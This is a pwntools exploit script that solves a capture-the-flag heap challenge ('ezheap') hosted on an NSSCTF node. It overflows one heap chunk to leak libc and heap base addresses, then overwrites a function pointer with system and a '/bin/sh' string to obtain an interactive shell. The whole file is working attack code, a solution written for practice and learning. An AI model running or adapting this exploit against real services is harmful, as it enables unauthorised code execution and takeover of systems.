from pwn import *
import sys
remote_addr = ["node3.anna.nssctf.cn",28531]
libc = ELF('./libc-2.23.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./ezheap_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sa(b'Choice: ', str(idx).encode())

def add(idx, size, name = b'a', content = b'a'):
    menu(1)
    sla(b'idx:\n', str(idx).encode())
    sla(b'Size:\n', str(size).encode())
    sa(b'Name: \n', name)
    sa(b'Content:\n', content)

def delete(idx):
    menu(2)
    sla(b'idx:\n', str(idx).encode())

def show(idx):
    menu(3)
    sla(b'idx:\n', str(idx).encode())

def edit(idx, size, content):
    menu(4)
    sla(b'idx:\n', str(idx).encode())
    sla(b'Size:\n', str(size).encode())
    s(content)

#debug("""
#    b *$rebase(0x1344)
#    b *$rebase(0x17ed)
#""")

add(0, 0x10)
add(1, 0x10)
edit(0, 0x31, p64(0) * 3 + p64(0x31) + p64(0) * 2 + p8(0x30))
show(1)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc_base', libc.address)

edit(0, 0x31, p64(0) * 3 + p64(0x31) + p64(0) * 2 + p8(0x20))
show(1)

heap_base = u64(ru(b'\x55')[-6:].ljust(8, b'\x00')) - 0x40
pr('heap_base', heap_base)

system = libc.sym['system']
edit(0, 0x48, b'/bin/sh\x00' + p64(0) * 2 + p64(0x31) + p64(0) * 2 + p64(heap_base + 0x40) + p64(0) + p64(system))
show(1)

shell()
